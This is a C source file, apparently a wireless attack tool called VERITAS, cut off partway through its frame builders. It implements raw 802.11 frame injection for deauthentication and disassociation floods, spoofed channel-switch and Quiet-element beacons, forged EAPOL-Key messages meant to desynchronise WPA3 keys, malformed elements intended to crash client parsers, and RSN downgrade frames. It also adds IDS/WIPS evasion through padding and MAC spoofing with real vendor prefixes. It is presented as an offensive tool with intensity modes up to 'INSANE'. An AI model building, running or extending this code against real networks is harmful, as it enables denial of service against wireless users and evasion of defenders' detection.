
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <ctype.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <glob.h>
#include <linux/filter.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <math.h>
#include <net/if.h>
#include <pthread.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

/* ============================================================
 *               COLOR SYSTEM
 * ============================================================ */

#define RST "\033[0m"
#define BLD "\033[1m"
#define DIM "\033[2m"

#define C_CYAN "\033[38;5;45m"
#define C_AQUA "\033[38;5;51m"
#define C_ICE "\033[38;5;87m"
#define C_BLUE "\033[38;5;33m"
#define C_ELECTRIC "\033[38;5;81m"
#define C_WHITE "\033[38;5;255m"
#define C_GRAY "\033[38;5;244m"
#define C_DIM_GRAY "\033[38;5;236m"
#define C_GREEN "\033[38;5;83m"
#define C_YELLOW "\033[38;5;226m"
#define C_ORANGE "\033[38;5;208m"
#define C_RED "\033[38;5;196m"
#define C_DEEP_B "\033[38;5;18m"

static const char *BANNER =
    "\n" C_DEEP_B BLD
    "   ╔══════════════════════════════════════════════════════════════╗" RST
    "\n" C_BLUE BLD
    "   ║    ██╗   ██╗███████╗██████╗ ██╗████████╗ █████╗ ███████╗     ║" RST
    "\n" C_CYAN BLD
    "   ║    ██║   ██║█████╗  ██████╔╝██║   ██║   ███████║███████╗     ║" RST
    "\n" C_AQUA BLD
    "   ║     ╚████╔╝ ███████╗██║  ██║██║   ██║   ██║  ██║███████║     ║" RST
    "\n" C_ICE BLD
    "   ║      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝     ║" RST
    "\n" C_DEEP_B BLD
    "   ╠══════════════════════════════════════════════════════════════╣" RST
    "\n" C_ICE BLD
    "   ║      V E R I T A S   v 4 . 7       —      Author mrc4t       ║" RST
    "\n" C_DEEP_B BLD
    "   ╚══════════════════════════════════════════════════════════════╝" RST
    "\n";

/* ============================================================
 *               CONSTANTS
 * ============================================================ */

#define VERSION "4.6.0"
#define MAX_SSID_LEN 32
#define MAX_MAC_STR 18
#define MAX_IFACE 32
#define MAX_PATH_LEN 256
#define MAX_APS 50
#define MAX_AUTH_POOL 16
#define MAX_PKT_SIZE 512
#define MAX_FRAG_PAYLOAD 128
#define SNDBUF_SIZE (2 * 1024 * 1024)
#define BATCH_SIZE 16

/* [FIX 34] DFS channel detection */
static bool is_dfs_ch(int ch) {
  return (ch >= 52 && ch <= 64) || (ch >= 100 && ch <= 144);
}

/* ============================================================
 *               ENUMS
 * ============================================================ */

typedef enum {
  VEC_CSA_BEACON = 0,
  VEC_QUIET_ELEMENT,
  VEC_DEAUTH_FLOOD,
  VEC_DISASSOC_FLOOD,
  VEC_EAPOL_LOGOFF,
  VEC_PMKID_CAPTURE,
  VEC_AUTH_DOS,
  VEC_CSA_ACTION,
  VEC_BEACON_CONFUSION,
  VEC_PROBE_RESPONSE_CSA,
  VEC_DELBA_ATTACK,
  VEC_POWER_SAVE,
  VEC_FRAGATTACK,
  VEC_DFS_FAKE_RADAR,
  VEC_CTS_NAV_JAMMER,
  VEC_SAE_HUNTING,
  VEC_BSS_TRANSITION,
  VEC_BEACON_REPORT_DRAIN,
  VEC_COUNT
} attack_vector_t;

static const char *VEC_NAMES[] = {
    "CSA Beacon Flood",
    "Quiet Element DoS",
    "Deauth Flood",
    "Disassoc Flood",
    "EAPOL Logoff",
    "PMKID Capture",
    "Auth Table DoS",
    "CSA Action Frame",
    "Beacon Confusion",
    "Probe Response CSA",
    "DELBA Attack",
    "Power Save DoS",
    "FragAttack Injection",
    "Operating Channel Aggression",
    "CTS/RTS Virtual Jammer",
    "WPA3 SAE Hunting",
    "BSS Transition (802.11v)",
    "Beacon Report Drain",
};

typedef enum {
  MODE_STEALTH = 1,
  MODE_LOW = 2,
  MODE_MEDIUM = 3,
  MODE_HIGH = 4,
  MODE_INSANE = 5,
} attack_mode_t;

static const char *MODE_NAMES[] = {"",       "STEALTH", "LOW",
                                   "MEDIUM", "HIGH",    "INSANE"};

/* ============================================================
 *               DATA STRUCTURES
 * ============================================================ */

typedef struct {
  char bssid[MAX_MAC_STR];
  char ssid[MAX_SSID_LEN + 1];
  int channel;
  char encryption[16];
  int power;
} target_ap_t;

typedef struct {
  bool vec_on[VEC_COUNT];
  int nvec;
  attack_mode_t mode;
  char iface[MAX_IFACE];
  char iface2[MAX_IFACE];
  int duration;
  int new_ch;
  int ch_width; /* [FIX 43] 20/40/80/160 MHz */
  char client[MAX_MAC_STR];
  bool dual_radio;
  bool ids_bypass;
  bool log_pmkid;
  bool spawn_rogue;
  bool unmask_hidden;
  bool split_role; /* [FEATURE] Hunter-Killer split role */
  #define MAX_TRACK_SSIDS 8
  char target_ssid_track[MAX_TRACK_SSIDS][MAX_SSID_LEN + 1]; /* [FEATURE] SSID Tracking */
  int target_ssid_track_cnt;
  char rogue_ssid[MAX_SSID_LEN + 1];
  double refresh_rate;
  char stats_file[MAX_PATH_LEN];
} config_t;

typedef struct {
  char iface[MAX_IFACE];
  attack_mode_t mode;
  bool vec_on[VEC_COUNT];
  int nvec;
  bool scan_5ghz;
  bool unmask_hidden;
  int duration;
  bool dual_radio;
  char iface2[MAX_IFACE];
  char export_file[MAX_PATH_LEN];
  char target_ssid_track[MAX_TRACK_SSIDS][MAX_SSID_LEN + 1]; /* [FEATURE] SSID Tracking for stress */
  int target_ssid_track_cnt;
  bool split_role; /* [FEATURE] Hunter-Killer split role */
} stress_cfg_t;

static void run_stress(stress_cfg_t *cfg);

/* [FIX 4] Lock-free atomic counters */
static atomic_uint_fast64_t g_pkts_sent = 0;
static atomic_uint_fast64_t g_pkts_fail = 0;
static volatile sig_atomic_t g_stop = 0;
static double g_start_time = 0;
static int g_total_threads = 0; /* [FIX 19] for rate division */

/* [FIX 14] Per-thread xorshift64 PRNG */
typedef struct {
  uint64_t s;
} xorshift64_t;

static uint64_t xs64_next(xorshift64_t *x) {
  uint64_t s = x->s;
  s ^= s << 13;
  s ^= s >> 7;
  s ^= s << 17;
  x->s = s;
  return s;
}

static int xs64_range(xorshift64_t *x, int lo, int hi) {
  if (lo >= hi)
    return lo;
  return lo + (int)(xs64_next(x) % (uint64_t)(hi - lo + 1));
}

static void xs64_seed(xorshift64_t *x) {
  int fd = open("/dev/urandom", O_RDONLY);
  if (fd >= 0) {
    if (read(fd, &x->s, 8) < 8)
      x->s = (uint64_t)time(NULL) ^ (uint64_t)pthread_self();
    close(fd);
  } else {
    x->s = (uint64_t)time(NULL) ^ (uint64_t)pthread_self();
  }
  if (x->s == 0)
    x->s = 1;
}

/* ============================================================
 *               802.11 FRAME STRUCTURES (packed)
 * ============================================================ */

typedef struct __attribute__((packed)) {
  uint8_t ver, pad;
  uint16_t len;
  uint32_t present;
  uint16_t tx_flags;
} rt_hdr_t;

typedef struct __attribute__((packed)) {
  uint16_t fc, dur;
  uint8_t a1[6], a2[6], a3[6];
  uint16_t seq;
} dot11_t;

typedef struct __attribute__((packed)) {
  uint64_t ts;
  uint16_t interval;
  uint16_t cap;
} beacon_fix_t;

typedef struct __attribute__((packed)) {
  uint8_t mode, ch, count;
} csa_ie_t;

typedef struct __attribute__((packed)) {
  uint8_t cnt, period;
  uint16_t dur, offset;
} quiet_ie_t;

typedef struct __attribute__((packed)) {
  uint8_t dsap, ssap, ctrl;
  uint8_t oui[3];
  uint16_t type;
} llc_snap_t;

typedef struct __attribute__((packed)) {
  uint8_t ver, type;
  uint16_t len;
} eapol_t;

typedef struct {
  uint8_t buf[MAX_PKT_SIZE];
  int len;
} pkt_t;


typedef struct __attribute__((packed)) {
  uint32_t magic_number;  
  uint16_t version_major; 
  uint16_t version_minor; 
  int32_t  thiszone;      
  uint32_t sigfigs;       
  uint32_t snaplen;       
  uint32_t network;       
} pcap_hdr_t;


typedef struct __attribute__((packed)) {
  uint32_t ts_sec;   
  uint32_t ts_usec;  
  uint32_t incl_len; 
  uint32_t orig_len; 
} pcaprec_hdr_t;

/* ============================================================
 *               UTILITIES
 * ============================================================ */

static double mono_time(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return ts.tv_sec + ts.tv_nsec * 1e-9;
}

static uint64_t mono_us(void) {
  static __thread uint64_t ts = 0;
  if (!ts) {
    struct timespec real_ts;
    clock_gettime(CLOCK_MONOTONIC, &real_ts);
    ts = (uint64_t)real_ts.tv_sec * 1000000ULL +
         (uint64_t)(real_ts.tv_nsec / 1000);
  }
  ts += 100; 
  return ts;
}

static void usleep_precise(double sec) {
  if (sec <= 0)
    return;
  struct timespec ts = {.tv_sec = (time_t)sec,
                        .tv_nsec = (long)((sec - (time_t)sec) * 1e9)};
  nanosleep(&ts, NULL);
}

static int parse_mac(const char *s, uint8_t o[6]) {
  unsigned a[6];
  if (sscanf(s, "%x:%x:%x:%x:%x:%x", &a[0], &a[1], &a[2], &a[3], &a[4],
             &a[5]) != 6) {
    if (sscanf(s, "%x-%x-%x-%x-%x-%x", &a[0], &a[1], &a[2], &a[3], &a[4],
               &a[5]) != 6)
      return -1;
  }
  for (int i = 0; i < 6; i++) {
    if (a[i] > 255)
      return -1;
    o[i] = (uint8_t)a[i];
  }
  return 0;
}

static void format_mac(const uint8_t m[6], char out[MAX_MAC_STR]) {
  snprintf(out, MAX_MAC_STR, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2],
           m[3], m[4], m[5]);
}

static bool valid_mac(const char *m) {
  if (!m || strlen(m) != 17)
    return false;
  for (int i = 0; i < 17; i++) {
    if ((i + 1) % 3 == 0) {
      if (m[i] != ':' && m[i] != '-')
        return false;
    } else {
      if (!isxdigit((unsigned char)m[i]))
        return false;
    }
  }
  return true;
}

static bool valid_ch(int c) {
  return (c >= 1 && c <= 14) || (c >= 36 && c <= 165);
}

static void rand_mac(uint8_t o[6]) {
  static __thread xorshift64_t rng;
  static __thread bool rng_init = false;
  if (!rng_init) {
    xs64_seed(&rng);
    rng_init = true;
  }

  /* [FIX] OUI-Aware Realistic MAC Spoofing (Bypass IDS/WIPS) */
  static const uint8_t REAL_OUIS[][3] = {
      {0x00, 0x14, 0x22}, 
      {0x00, 0x24, 0xD7}, 
      {0x0C, 0x4D, 0xE9}, 
      {0x18, 0x3D, 0xA2}, 
      {0x30, 0x39, 0x26}, 
      {0x48, 0x4B, 0xAA}, 
      {0x50, 0xCC, 0xF8}, 
      {0x90, 0xB6, 0x86}, 
  };
  const int n_ouis = sizeof(REAL_OUIS) / sizeof(REAL_OUIS[0]);

  uint64_t r = xs64_next(&rng);
  int oui_idx = (int)(r % n_ouis);

  
  o[0] = REAL_OUIS[oui_idx][0];
  o[1] = REAL_OUIS[oui_idx][1];
  o[2] = REAL_OUIS[oui_idx][2];

  
  o[3] = (uint8_t)((r >> 8) & 0xFF);
  o[4] = (uint8_t)((r >> 16) & 0xFF);
  o[5] = (uint8_t)((r >> 24) & 0xFF);

  
  o[0] &= 0xFC;
}

static void get_term_size(int *c, int *r) {
  struct winsize w;
  if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &w) == 0) {
    *c = w.ws_col > 0 ? w.ws_col : 80;
    *r = w.ws_row > 0 ? w.ws_row : 24;
  } else {
    *c = 80;
    *r = 24;
  }
}

static void ssid_to_hex(const char *ssid, char *hex, size_t hexsz) {
  size_t sl = strlen(ssid);
  size_t i;
  for (i = 0; i < sl && (i * 2 + 2) < hexsz; i++)
    snprintf(hex + i * 2, 3, "%02x", (unsigned char)ssid[i]);
  hex[i * 2] = 0;
}

/* ============================================================
 *               RAW SOCKET ENGINE
 * ============================================================ */

static int raw_socket(const char *iface) {
  int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (s < 0) {
    fprintf(stderr, "  " C_RED "[!] socket(AF_PACKET): %s" RST "\n",
            strerror(errno));
    return -1;
  }
  int sndbuf = SNDBUF_SIZE;
  setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

  struct sockaddr_ll sll = {
      .sll_family = AF_PACKET,
      .sll_protocol = htons(ETH_P_ALL),
      .sll_ifindex = (int)if_nametoindex(iface),
  };
  if (sll.sll_ifindex == 0) {
    fprintf(stderr, "  " C_RED "[!] Interface '%s' not found" RST "\n", iface);
    close(s);
    return -1;
  }
  if (bind(s, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
    fprintf(stderr, "  " C_RED "[!] bind('%s'): %s" RST "\n", iface,
            strerror(errno));
    close(s);
    return -1;
  }
  return s;
}

static int inject_batch(int sock, pkt_t *pkts, int count) {
  struct mmsghdr msgs[BATCH_SIZE];
  struct iovec iovs[BATCH_SIZE];
  int n = count > BATCH_SIZE ? BATCH_SIZE : count;
  memset(msgs, 0, sizeof(msgs));
  for (int i = 0; i < n; i++) {
    iovs[i].iov_base = pkts[i].buf;
    iovs[i].iov_len = (size_t)pkts[i].len;
    msgs[i].msg_hdr.msg_iov = &iovs[i];
    msgs[i].msg_hdr.msg_iovlen = 1;
  }
  return (int)sendmmsg(sock, msgs, (unsigned)n, 0);
}

static int inject_one(int sock, const uint8_t *p, int len) {
  return (int)send(sock, p, (size_t)len, 0);
}

/* ============================================================
 *               FRAME BUILDERS
 * ============================================================ */

static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

#define FC_PROBEREQ 0x0040
#define FC_PROBERESP 0x0050
#define FC_BEACON 0x0080
#define FC_AUTH 0x00B0
#define FC_DEAUTH 0x00C0
#define FC_DISASSOC 0x00A0
#define FC_ACTION 0x00D0
#define FC_CTS 0x00C4       
#define FC_DATA_TODS 0x0108 /* [FIX 5] Data frame with ToDS */

/* [FIX 47] Zero-copy byte offsets for in-place template modification.
 * Calculated from packed struct sizes:
 *   rt_hdr_t  = 10 bytes (ver:1 + pad:1 + len:2 + present:4 + tx_flags:2)
 *   dot11_t   = 24 bytes (fc:2 + dur:2 + a1:6 + a2:6 + a3:6 + seq:2)
 * All offsets are from buffer[0]. */
#define OFF_A1 (sizeof(rt_hdr_t) + offsetof(dot11_t, a1))   
#define OFF_A2 (sizeof(rt_hdr_t) + offsetof(dot11_t, a2))   
#define OFF_A3 (sizeof(rt_hdr_t) + offsetof(dot11_t, a3))   
#define OFF_SEQ (sizeof(rt_hdr_t) + offsetof(dot11_t, seq)) 
#define OFF_BODY (sizeof(rt_hdr_t) + sizeof(dot11_t))       

/* [FIX 4] TX_FLAGS = NOACK(0x0008) | NOSEQ(0x0010) */
static int mk_rt(uint8_t *b) {
  rt_hdr_t *h = (rt_hdr_t *)b;
  h->ver = 0;
  h->pad = 0;
  h->len = htole16(sizeof(rt_hdr_t)); /* [FIX 41] */
  h->present = htole32(1 << 15);      /* [FIX 41] */
  h->tx_flags = htole16(0x0018);      /* [FIX 4] NOACK|NOSEQ */
  return sizeof(rt_hdr_t);
}

static int mk_dot11(uint8_t *b, uint16_t fc, const uint8_t d[6],
                    const uint8_t s[6], const uint8_t bs[6], uint16_t seq) {
  dot11_t *h = (dot11_t *)b;
  h->fc = htole16(fc); /* [FIX 41] */
  h->dur = 0;
  memcpy(h->a1, d, 6);
  memcpy(h->a2, s, 6);
  memcpy(h->a3, bs, 6);
  h->seq = htole16(seq << 4); /* [FIX 41] */
  return sizeof(dot11_t);
}

static int mk_probe_req(uint8_t *b, const uint8_t bss[6], const char *target_ssid) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_PROBEREQ, bss ? bss : BCAST, BCAST, bss ? bss : BCAST,
                0);
  
  if (target_ssid && target_ssid[0]) {
    
    int sl = (int)strlen(target_ssid);
    if (sl > MAX_SSID_LEN) sl = MAX_SSID_LEN;
    b[o++] = 0;
    b[o++] = (uint8_t)sl;
    memcpy(b + o, target_ssid, sl);
    o += sl;
  } else {
    
    b[o++] = 0;
    b[o++] = 0;
  }
  
  
  b[o++] = 1;
  b[o++] = 8;
  b[o++] = 0x82;
  b[o++] = 0x84;
  b[o++] = 0x8b;
  b[o++] = 0x96;
  b[o++] = 0x0c;
  b[o++] = 0x12;
  b[o++] = 0x18;
  b[o++] = 0x24;
  return o;
}

/* [FIX 6] Helper: append DS Parameter Set IE */
static int mk_ds_ie(uint8_t *b, uint8_t ch) {
  b[0] = 3;
  b[1] = 1;
  b[2] = ch;
  return 3;
}

/* [FIX 6] cur_ch parameter added to all beacon/probe builders */
static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
                         uint8_t cur_ch, uint8_t new_ch, uint8_t count, uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, seq);

  beacon_fix_t *f = (beacon_fix_t *)(b + o);
  f->ts = htole64(mono_us());
  f->interval = htole16(100);
  f->cap = htole16(0x0031);
  o += sizeof(beacon_fix_t);

  
  int sl = (int)strlen(ssid);
  if (sl > MAX_SSID_LEN)
    sl = MAX_SSID_LEN;
  b[o++] = 0;
  b[o++] = (uint8_t)sl;
  memcpy(b + o, ssid, sl);
  o += sl;

  /* [FIX] DS Parameter Set IE must reflect current operating channel */
  o += mk_ds_ie(b + o, cur_ch);

  
  b[o++] = 37;
  b[o++] = 3;
  csa_ie_t *c = (csa_ie_t *)(b + o);
  c->mode = 1;
  c->ch = new_ch;
  c->count = count;
  o += sizeof(csa_ie_t);

  /* [UPGRADE] Extended CSA IE (ID=60, len=4) for modern 5GHz/WiFi6 clients */
  b[o++] = 60;
  b[o++] = 4;
  b[o++] = 1; 
  b[o++] = new_ch <= 14 ? 81 : 115; 
  b[o++] = new_ch;
  b[o++] = count; 

  /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
  b[o++] = 40;
  b[o++] = 6;
  b[o++] = 1; 
  b[o++] = 1; 
  uint16_t qdur = htole16(100); 
  memcpy(b + o, &qdur, 2); o += 2;
  uint16_t qoff = htole16(0);
  memcpy(b + o, &qoff, 2); o += 2;
  /* =========================================================================
   * [UPGRADE] OMNI-PANIC PROTOCOL MALFORMATION (IE Stacking)
   * Applied to ALL bands (2.4GHz & 5GHz) to crash parsing logic universally
   * ========================================================================= */

  
  b[o++] = 61;
  b[o++] = 22;
  b[o++] = cur_ch;
  b[o++] = 0x03; 
  for (int i = 0; i < 20; i++) b[o++] = 0x00; 

  
  b[o++] = 192;
  b[o++] = 5;
  b[o++] = 2;   
  b[o++] = 255; 
  b[o++] = 255; 
  b[o++] = 0xff; 
  b[o++] = 0xff;

  
  b[o++] = 255; 
  b[o++] = 6;
  b[o++] = 36;  
  b[o++] = 0x00; 
  b[o++] = 0x00;
  b[o++] = 0x00;
  b[o++] = 0x3f; 
  b[o++] = 0x00;

  /* =========================================================================
   * [UPGRADE] RSN Downgrade Poisoning (WPA3 Self-Banishment)
   * Advertises WPA-TKIP to trigger client-side KRACK protection lockouts
   * ========================================================================= */
  b[o++] = 48; 
  b[o++] = 20;
  b[o++] = 0x01; b[o++] = 0x00; 
  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
  b[o++] = 0x01; b[o++] = 0x00; 
  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
  b[o++] = 0x01; b[o++] = 0x00; 
  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
  b[o++] = 0x00; b[o++] = 0x00; 

  return o;
}

static int mk_quiet_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
                           uint8_t cur_ch) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, 0);

  beacon_fix_t *f = (beacon_fix_t *)(b + o);
  f->ts = htole64(mono_us());
  f->interval = htole16(100);
  f->cap = htole16(0x0031);
  o += sizeof(beacon_fix_t);

  int sl = (int)strlen(ssid);
  if (sl > MAX_SSID_LEN)
    sl = MAX_SSID_LEN;
  b[o++] = 0;
  b[o++] = (uint8_t)sl;
  memcpy(b + o, ssid, sl);
  o += sl;

  /* [FIX 6] DS Parameter Set IE */
  o += mk_ds_ie(b + o, cur_ch);

  
  b[o++] = 40;
  b[o++] = 6;
  quiet_ie_t *q = (quiet_ie_t *)(b + o);
  q->cnt = 1;              /* [FIX 7] was 0 */
  q->period = 1;           /* [FIX 7] was 0 */
  q->dur = htole16(65535); /* [FIX 41] */
  q->offset = 0;
  o += sizeof(quiet_ie_t);
  return o;
}

static int mk_deauth(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
                     uint16_t reason, uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_DEAUTH, cli, bss, bss, seq);
  uint16_t r = htole16(reason); /* [FIX 41] */
  memcpy(b + o, &r, 2);
  o += 2;

  /* [UPGRADE] Variable Length WIPS Evasion Padding based on seq */
  uint8_t pad_len = 7 + (seq % 16); 
  b[o++] = 221;
  b[o++] = pad_len;
  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; 
  b[o++] = 0x02; 
  for (int i = 0; i < pad_len - 4; i++) {
      b[o++] = (uint8_t)(seq + i); 
  }

  return o;
}

static int mk_deauth_rev(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
                         uint16_t reason, uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_DEAUTH, bss, cli, bss, seq);
  uint16_t r = htole16(reason);
  memcpy(b + o, &r, 2);
  o += 2;

  /* [UPGRADE] Variable Length WIPS Evasion Padding based on seq */
  uint8_t pad_len = 7 + (seq % 16);
  b[o++] = 221;
  b[o++] = pad_len;
  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; 
  b[o++] = 0x02; 
  for (int i = 0; i < pad_len - 4; i++) {
      b[o++] = (uint8_t)(seq + i); 
  }

  return o;
}

static int mk_disassoc(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
                       uint16_t reason, uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_DISASSOC, cli, bss, bss, seq);
  uint16_t r = htole16(reason);
  memcpy(b + o, &r, 2);
  o += 2;

  /* [UPGRADE] Variable Length WIPS Evasion Padding based on seq */
  uint8_t pad_len = 7 + (seq % 16);
  b[o++] = 221;
  b[o++] = pad_len;
  b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; 
  b[o++] = 0x02; 
  for (int i = 0; i < pad_len - 4; i++) {
      b[o++] = (uint8_t)(seq + i); 
  }

  return o;
}

/* [FIX 5] EAPOL Logoff with ToDS + correct address order */
static int mk_eapol_logoff(uint8_t *b, const uint8_t bss[6],
                           const uint8_t cli[6]) {
  int o = 0;
  o += mk_rt(b + o);
  /* [FIX 5] ToDS: addr1=BSSID(RA), addr2=SA(client), addr3=DA(BSSID) */
  o += mk_dot11(b + o, FC_DATA_TODS, bss, cli, bss, 0);

  llc_snap_t *l = (llc_snap_t *)(b + o);
  l->dsap = 0xAA;
  l->ssap = 0xAA;
  l->ctrl = 0x03;
  memset(l->oui, 0, 3);
  l->type = htons(0x888E);
  o += sizeof(llc_snap_t);

  /* [UPGRADE] WPA3 Temporal Key Desync (EAPOL-Key M1 Spoofing)
   * Instead of sending a simple EAPOL Logoff (which WPA3 ignores),
   * we inject a fake EAPOL-Key Message 1 with a random ANonce.
   * This forces the client/AP WPA3 state machine to attempt a re-keying,
   * instantly desynchronizing their temporal keys and causing all
   * subsequent legitimate encrypted traffic to be dropped. */
  eapol_t *e = (eapol_t *)(b + o);
  e->ver = 2; 
  e->type = 3; 
  e->len = htons(95); 
  o += sizeof(eapol_t);

  
  b[o++] = 254; 
  
  
  uint16_t key_info = htole16(0x008A); 
  memcpy(b + o, &key_info, 2); o += 2;
  
  
  uint16_t key_len = htole16(16);
  memcpy(b + o, &key_len, 2); o += 2;
  
  
  uint64_t replay_ctr = htole64(mono_us()); 
  memcpy(b + o, &replay_ctr, 8); o += 8;
  
  
  for (int i = 0; i < 32; i++) b[o++] = (uint8_t)(mono_us() & 0xFF); 
  
  
  memset(b + o, 0, 16); o += 16;
  
  
  memset(b + o, 0, 8); o += 8;
  
  
  memset(b + o, 0, 8); o += 8;
  
  
  memset(b + o, 0, 16); o += 16;
  
  
  uint16_t key_data_len = 0;
  memcpy(b + o, &key_data_len, 2); o += 2;
  
  return o;
}

static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
                         uint8_t new_ch, uint8_t count, uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, seq);
  b[o++] = 0; 
  b[o++] = 4; 
  
  
  b[o++] = 37;
  b[o++] = 3;
  b[o++] = 1; 
  b[o++] = new_ch;
  b[o++] = count; 

  /* [UPGRADE] Extended CSA IE (ID=60, len=4) piggybacked */
  b[o++] = 60;
  b[o++] = 4;
  b[o++] = 1; 
  b[o++] = new_ch <= 14 ? 81 : 115; 
  b[o++] = new_ch;
  b[o++] = count; 

  /* [UPGRADE] Piggybacked Quiet Element (ID=40, len=6) to enforce radio silence */
  b[o++] = 40;
  b[o++] = 6;
  b[o++] = 1; 
  b[o++] = 1; 
  uint16_t qdur = htole16(100); 
  memcpy(b + o, &qdur, 2); o += 2;
  uint16_t qoff = htole16(0);
  memcpy(b + o, &qoff, 2); o += 2;
  /* =========================================================================
   * [UPGRADE] OMNI-PANIC PROTOCOL MALFORMATION (IE Stacking)
   * Applied to ALL bands (2.4GHz & 5GHz) to crash parsing logic universally
   * ========================================================================= */

  
  b[o++] = 61;
  b[o++] = 22;
  b[o++] = new_ch; 
  b[o++] = 0x03; 
  for (int i = 0; i < 20; i++) b[o++] = 0x00; 

  
  b[o++] = 192;
  b[o++] = 5;
  b[o++] = 2;   
  b[o++] = 255; 
  b[o++] = 255; 
  b[o++] = 0xff; 
  b[o++] = 0xff;

  
  b[o++] = 255; 
  b[o++] = 6;
  b[o++] = 36;  
  b[o++] = 0x00; 
  b[o++] = 0x00;
  b[o++] = 0x00;
  b[o++] = 0x3f; 
  b[o++] = 0x00;

  return o;
}

/* [FIX 8] Probe Response with client MAC parameter */
static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
                             const uint8_t dst[6], const char *ssid,
                             uint8_t cur_ch, uint8_t new_ch, uint8_t count, uint16_t seq) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_PROBERESP, dst, bss, bss, seq); /* [FIX 8] unicast */

  beacon_fix_t *f = (beacon_fix_t *)(b + o);
  f->ts = htole64(mono_us());
  f->interval = htole16(100);
  f->cap = htole16(0x0031);
  o += sizeof(beacon_fix_t);

  int sl = (int)strlen(ssid);
  if (sl > MAX_SSID_LEN)
    sl = MAX_SSID_LEN;
  b[o++] = 0;
  b[o++] = (uint8_t)sl;
  memcpy(b + o, ssid, sl);
  o += sl;

  /* [FIX] DS Parameter Set IE must reflect current operating channel */
  o += mk_ds_ie(b + o, cur_ch);

  b[o++] = 37;
  b[o++] = 3;
  csa_ie_t *c = (csa_ie_t *)(b + o);
  c->mode = 1;
  c->ch = new_ch;
  c->count = count;
  o += sizeof(csa_ie_t);

  /* [UPGRADE] Extended CSA IE (ID=60, len=4) */
  b[o++] = 60;
  b[o++] = 4;
  b[o++] = 1; 
  b[o++] = new_ch <= 14 ? 81 : 115; 
  b[o++] = new_ch;
  b[o++] = count; 

  /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
  b[o++] = 40;
  b[o++] = 6;
  b[o++] = 1; 
  b[o++] = 1; 
  uint16_t qdur = htole16(100); 
  memcpy(b + o, &qdur, 2); o += 2;
  uint16_t qoff = htole16(0);
  memcpy(b + o, &qoff, 2); o += 2;
  /* =========================================================================
   * [UPGRADE] OMNI-PANIC PROTOCOL MALFORMATION (IE Stacking)
   * Applied to ALL bands (2.4GHz & 5GHz) to crash parsing logic universally
   * ========================================================================= */

  
  b[o++] = 61;
  b[o++] = 22;
  b[o++] = cur_ch;
  b[o++] = 0x03; 
  for (int i = 0; i < 20; i++) b[o++] = 0x00; 

  
  b[o++] = 192;
  b[o++] = 5;
  b[o++] = 2;   
  b[o++] = 255; 
  b[o++] = 255; 
  b[o++] = 0xff; 
  b[o++] = 0xff;

  
  b[o++] = 255; 
  b[o++] = 6;
  b[o++] = 36;  
  b[o++] = 0x00; 
  b[o++] = 0x00;
  b[o++] = 0x00;
  b[o++] = 0x3f; 
  b[o++] = 0x00;

  /* =========================================================================
   * [UPGRADE] RSN Downgrade Poisoning (WPA3 Self-Banishment)
   * Advertises WPA-TKIP to trigger client-side KRACK protection lockouts
   * ========================================================================= */
  b[o++] = 48; 
  b[o++] = 20;
  b[o++] = 0x01; b[o++] = 0x00; 
  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
  b[o++] = 0x01; b[o++] = 0x00; 
  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
  b[o++] = 0x01; b[o++] = 0x00; 
  b[o++] = 0x00; b[o++] = 0x0f; b[o++] = 0xac; b[o++] = 0x02; 
  b[o++] = 0x00; b[o++] = 0x00; 

  return o;
}

static int mk_auth(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6]) {
  int o = 0;
  o += mk_rt(b + o);
  o += mk_dot11(b + o, FC_AUTH, bss, cli, bss, 0);
